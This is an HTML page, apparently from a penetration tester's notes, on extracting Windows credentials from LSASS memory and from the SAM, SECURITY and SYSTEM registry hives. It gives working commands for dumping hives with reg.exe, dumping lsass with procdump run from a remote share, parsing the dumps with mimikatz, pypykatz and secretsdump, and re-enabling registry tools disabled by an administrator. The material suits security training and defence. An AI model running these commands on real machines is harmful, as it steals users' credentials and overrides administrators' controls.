@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Credential Extraction (LSASS/SAM) - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Credential Extraction", url: "#_top", children: [
+              {title: "Local Security Authority Subsystem Service - LSASS", url: "#local-security-authority-subsystem-service-lsass" },
+              {title: "Registry", url: "#registry" },
+          ]},
+          {title: "Extracting credentials from the LSASS process", url: "#extracting-credentials-from-the-lsass-process", children: [
+              {title: "Mimikatz/Pypykatz", url: "#mimikatzpypykatz" },
+          ]},
+          {title: "Extract credentials from SAM and SECURITY hives from registry", url: "#extract-credentials-from-sam-and-security-hives-from-registry", children: [
+              {title: "Bypassing restrictions", url: "#bypassing-restrictions" },
+              {title: "Extract credentials from SAM and SECURITY hives from disk", url: "#extract-credentials-from-sam-and-security-hives-from-disk" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../check_for_lockout_threshold/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../check_for_lockout_threshold/" class="btn btn-xs btn-link">
+        Check for Lockout Policy
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ntlm_relaying_and_theft/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ntlm_relaying_and_theft/" class="btn btn-xs btn-link">
+        NTLM Relaying and Theft
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="credential-extraction">Credential Extraction<a class="headerlink" href="#credential-extraction" title="Permanent link">#</a></h1>
+<p>Multiple credentials are stored on a windows computer. Credentials are usually extracted from two sources the process <code>Local Security Authority Subsystem Service (LSASS)</code> and from the registry.</p>
+<h2 id="local-security-authority-subsystem-service-lsass">Local Security Authority Subsystem Service - LSASS<a class="headerlink" href="#local-security-authority-subsystem-service-lsass" title="Permanent link">#</a></h2>
+<p>The Local Security Authority Subsystem Service (LSASS) stores credentials in memory on behalf of users with active Windows sessions.
+This allows users to seamlessly access network resources, such as file shares, Exchange Server mailboxes, and SharePoint sites, without re-entering their credentials for each remote service.</p>
+<p>Credentials are stored in the LSASS memory in the following actions are performed:
+- Logs on to a local session or RDP session on the computer
+- Runs a task by using the RunAs option
+- Runs an active Windows service on the computer
+- Runs a scheduled task or batch job
+- Runs a task on the local computer by using a remote administration tool</p>
+<h3 id="nt-hashes">NT Hashes<a class="headerlink" href="#nt-hashes" title="Permanent link">#</a></h3>
+<p>If a domain user performs any of the actions mentioned above the credentials, the NT-hash is stored in the LSASS process.</p>
+<h3 id="wdigest">WDigest<a class="headerlink" href="#wdigest" title="Permanent link">#</a></h3>
+<p>If WDigest is enabled the domain accounts credentials are stored in plaintext.</p>
+<h2 id="registry">Registry<a class="headerlink" href="#registry" title="Permanent link">#</a></h2>
+<p>There are three areas in the registry that are of relevance: <code>SAM</code>, <code>SECURITY</code> and <code>SYSTEM</code>.
+These three different areas contains different kinds of secrets.</p>
+<h3 id="sam-security-accounts-manager">SAM - Security Accounts Manager<a class="headerlink" href="#sam-security-accounts-manager" title="Permanent link">#</a></h3>
+<p>This "hive" (area in the registry) contains the hashed passwords for the local users. So it contains the NT-hashes of the local users, the same users that you see when you run <code>net user</code>.
+It is usually extracted like this:</p>
+<pre><code>C:\&gt; reg.exe save hklm\sam c:\temp\sam.save
+C:\&gt; reg.exe save hklm\system c:\temp\system.save
+</code></pre>
+
+<p>In order to extract the credentials you need the BOOTKEY, and that key is stored in the hive <code>SYSTEM</code>.</p>
+<p>The hashes can be extracted like this with impackets module <code>secretsdump.py</code>.</p>
+<pre><code>python secretsdump.py LOCAL -sam sam.save -system system.save
+</code></pre>
+
+<h3 id="domain-cached-credentials-dcc2-mscash">Domain Cached Credentials / DCC2 / MSCASH<a class="headerlink" href="#domain-cached-credentials-dcc2-mscash" title="Permanent link">#</a></h3>
+<p>When a domain user log in to a computer the credentials for that user is cached on the computer. So that it is possible to log on to the computer even when the computer is offline, and not able to communicate with the Domain Controller.</p>
+<p>These credentials are stored in the format of Domain Cached Credentials version 2 (DCC2) on Windows Vista and newer. This type of credentials can not be used for Pass-the-Hash attacks. These credentials does not expire. </p>
+<p>By default up to ten credentials are stored on the machine, on windows 10 at least. This can however be configured by configuring the following registry key, increase or decrease it.</p>
+<pre><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\CashedLogonsCount
+</code></pre>
+
+<p>The DCC2 hashes are stored in the <code>SECURITY</code> hive. To be more precis in : <code>HKEY_LOCAL_MACHINE\SECURITY\Cache</code>.</p>
+<pre><code>C:\&gt; reg.exe save hklm\security c:\temp\security.save
+C:\&gt; reg.exe save hklm\system c:\temp\system.save
+</code></pre>
+
+<p>The bootkey, which I think can be found in the <code>system</code> hive, needs to be provided in order to extract the DCC2 credentials.</p>
+<pre><code>python secretsdump.py LOCAL -security security.save -system system.save
+</code></pre>
+
+<p>The DCC2 credentials are not as fast and easy to crack as NT-hashes, but with the right password-list it can be done.</p>
+<h3 id="lsa-secrets">LSA Secrets<a class="headerlink" href="#lsa-secrets" title="Permanent link">#</a></h3>
+<p>LSA secrets is an area in the registry, under <code>Security</code> that contains different kinds of interesting secrets. The data is used by Local System Authority, which is why it is called LSA Secrets. Only the SYSTEM user can access the registry.  </p>
+<pre><code>HKEY_LOCAL_MACHINE/Security/Policy/Secrets
+</code></pre>
+
+<p><img alt="LSA" src="../../img/lsa-secrets-registry-location.png" title="LSA" /></p>
+<p>So what are these secrets?</p>
+<ul>
+<li>$MACHINE.ACC - Machine account password - Can be used as any other domain account</li>
+<li>DefaultPassword - If AutoLogon is enabled a password in cleartext can be found.</li>
+<li>NL$KM ??</li>
+</ul>
+<p>When services are run under the context of a local or domain user the credentials for that user is stored in <code>Secrets</code>.</p>
+<h1 id="extracting-credentials-from-the-lsass-process">Extracting credentials from the LSASS process<a class="headerlink" href="#extracting-credentials-from-the-lsass-process" title="Permanent link">#</a></h1>
+<p>Sometimes it is not desirable to use Mimikatz on the target machine, because mimikatz is flagged as malware by most antivirus. There are however other ways to solve the problem, using only windows tools. Living of the land.</p>
+<p>One way is to dump the lsass process. There are a few ways to do this, one is by using the Task Manager GUI, and the other is by using <code>procdump.exe</code> from sysinternals. Procdump is beneficial if you only have command line access, no gui.</p>
+<p><strong>Dump using Task manager</strong></p>
+<p>The GUI way: Open task manager as administrator, rightclick on lsass and click on "Create dump file". Transfer the dump-file to an offline windows machine with Mimikatz on it. </p>
+<p><strong>Dump using procdump.exe</strong></p>
+<p>If you don't want to download procdump.exe to the victim computer you can host it on another share and then mount the share, and run it from there. It is seldom allowed to mount shares without authentication.</p>
+<pre><code>net use k: \\10.10.11.11\bbb /user:username password
+</code></pre>
+
+<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+
+<h2 id="mimikatzpypykatz">Mimikatz/Pypykatz<a class="headerlink" href="#mimikatzpypykatz" title="Permanent link">#</a></h2>
+<p>Run mimikatz on your offline windows machine</p>
+<pre><code>token::elevate
+privilege::debug
+sekurlsa::minidump lsass.DMP
+sekurlsa::logonPasswords full
+</code></pre>
+
+<pre><code>pypykatz lsa minidump lsass.DMP
+</code></pre>
+
+<h1 id="extract-credentials-from-sam-and-security-hives-from-registry">Extract credentials from SAM and SECURITY hives from registry<a class="headerlink" href="#extract-credentials-from-sam-and-security-hives-from-registry" title="Permanent link">#</a></h1>
+<p>The other way to do it is simply to download the SAM, SYSTEM and SECURITY files from the compromised host. Transfer those files to your offline windows machine with Mimikatz on it, or simply use secretsdump.py.</p>
+<p>If the machine is running you need to dump the SAM and SYSTEM from the registry. </p>
+<pre><code>C:\&gt; reg.exe save hklm\sam c:\temp\sam.save
+C:\&gt; reg.exe save hklm\security c:\temp\security.save
+C:\&gt; reg.exe save hklm\system c:\temp\system.save
+</code></pre>
+
+<pre><code>python secretsdump.py LOCAL -sam ~/Documents/credsdump/sam.save -security ~/Documents/credsdump/security.save -system ~/Documents/credsdump/system.save
+</code></pre>
+
+<p>See the <a href="../../cracking_hashes/cracking_hashes">cracking chapter</a> for instructions on how to crack these hashes.</p>
+<h2 id="bypassing-restrictions">Bypassing restrictions<a class="headerlink" href="#bypassing-restrictions" title="Permanent link">#</a></h2>
+<p>If you encounter a error such as the following <code>ERROR Registry editing has been disabled by your administrator</code> you will need to bypass it.</p>
+<pre><code class="powershell"># First verify the current setting
+Get-ItemProperty -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; -Name DisableRegistryTools 
+# Change the setting to disable
+Set-ItemProperty -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; -Name DisableRegistryTools -Value 0
+</code></pre>
+
+<p>Some other techniques are found here: https://www.online-tech-tips.com/windows-xp/registry-disabled-by-administrator/</p>
+<h2 id="extract-credentials-from-sam-and-security-hives-from-disk">Extract credentials from SAM and SECURITY hives from disk<a class="headerlink" href="#extract-credentials-from-sam-and-security-hives-from-disk" title="Permanent link">#</a></h2>
+<p>If you have physical access to the machine and it does not use BitLocker you can just boot up the computer with a live linux and then mount the windows disk.</p>
+<pre><code># if the below command shows &quot;Microsoft basic data&quot; or nothing then it is likely that the partition is encrypted, and you can just forget about it and move on.
+blkid 
+lsblk -f
+
+
+# if the disk is ntfs or vfat you can mount it like this. Read only.
+
+mount -t ntfs-3g -o ro /dev/sda3 /mnt/something
+mount -t vfat -o ro /dev/sda3 /mnt/something
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../check_for_lockout_threshold/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../check_for_lockout_threshold/" class="btn btn-xs btn-link">
+        Check for Lockout Policy
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../ntlm_relaying_and_theft/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../ntlm_relaying_and_theft/" class="btn btn-xs btn-link">
+        NTLM Relaying and Theft
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
